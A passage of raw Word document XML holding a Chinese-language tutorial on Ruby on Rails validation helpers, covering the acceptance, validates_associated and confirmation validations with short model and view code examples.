      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项，分别用来指定校验何时执行以及当校验失败时，何种错误信息应该被添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合中</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的值必须为以下之一：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:save</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>(默认值)，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:create</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>：update</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。而</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">每个校验 helper 也有默认的错误信息，用在当 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:message</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD0375">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 没有指定时</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。现在让我们分别来看看 Rails 提供的校验 helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3048B1B0" w14:textId="7FF4A3AC"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3.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>acceptance</w:t>
      </w:r>
      <w:r w:rsidR="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 同意协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD584E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该校验用来验证当表单提交时，用户界面上的 checkbox 已经被选择。比较典型的使用场景是</w:t>
      </w:r>
      <w:r w:rsidRPr="005561B4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>在 用户使用你的应用前，需要确定其已经阅读过并接受你的服务条款</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，或者其他相似的情况下。 对于 web 应用，这个被接受的状态其实并不一定需要保存到数据库中(如果我们没有在数据库表中建立这个字段，该 helper 将为它创建一个虚拟属性)。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="03D5A9C7" w14:textId="77777777" w:rsidTr="005561B4">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D58753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7594F2E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xml:space="preserve">  validates :terms_of_service, </w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:acceptance</w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E38605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36DEF09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该校验的默认错误信息是 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be accepted</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C18F2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w:t>
      </w:r>
      <w:r w:rsidRPr="005561B4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">可以通过指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="005561B4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:accept</w:t>
      </w:r>
      <w:r w:rsidRPr="005561B4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定需要被接受选项的值，默认为"1"</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376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="04325C17" w14:textId="77777777" w:rsidTr="006542F8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="199D960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4D91294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:terms_of_service, :acceptance</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">=&gt; { </w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:accept</w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005561B4">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; 'yes'</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54E8DB5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1B039189" w14:textId="23A44DC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3.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validates_associated</w:t>
      </w:r>
      <w:r w:rsidR="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关联模型校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F2EA9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当你的模型和其它的模型有关联，并且</w:t>
      </w:r>
      <w:r w:rsidRPr="005561B4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>关联的模型也需要校验时</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，应该使用该校验 helper。当你试图保存 Active Record 对象时，它会在所有关联的对象上执行 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>valid?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3A920F86" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C1DA68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Library &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="488B3C0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has_many :books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="208A931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validates_associated :books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F38A15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106A52D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该校验可以在所有的关联类型下执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F8965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E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">不要在关联的两端同时使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validates_associated</w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 校验。这会导致相互调用而陷入死循环</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AC3CB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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is invalid</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。需要注意的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">每个关联对象都含有其各自的 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="00E35175">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合并不会被绑定到执行此校验的对象上</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA2A374" w14:textId="1CEA098E"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3.3 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>confirmation</w:t>
      </w:r>
      <w:r w:rsidR="006542F8">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> eg:确认密码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C658AF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当你有</w:t>
      </w:r>
      <w:r w:rsidRPr="004D0128">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>两个文本框，并且需确认他们的内容相同时</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，可以使用该校验 helper。例如，你需要确认用户输入的电子邮件地址或者密码。该校验方法会创建一个虚拟属性，名称为被确认字段名称后加 "_confirmation"。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5E5760B1" w14:textId="77777777" w:rsidTr="004D0128">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E90AF7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1FA87FF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:email, :confirmation</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1E41D36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59255D7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在视图模板中使用如下</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5736"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="453E1B96" w14:textId="77777777" w:rsidTr="004D0128">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="097E6430" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="006542F8" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>text_field :person, :email</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50D63863" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006542F8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
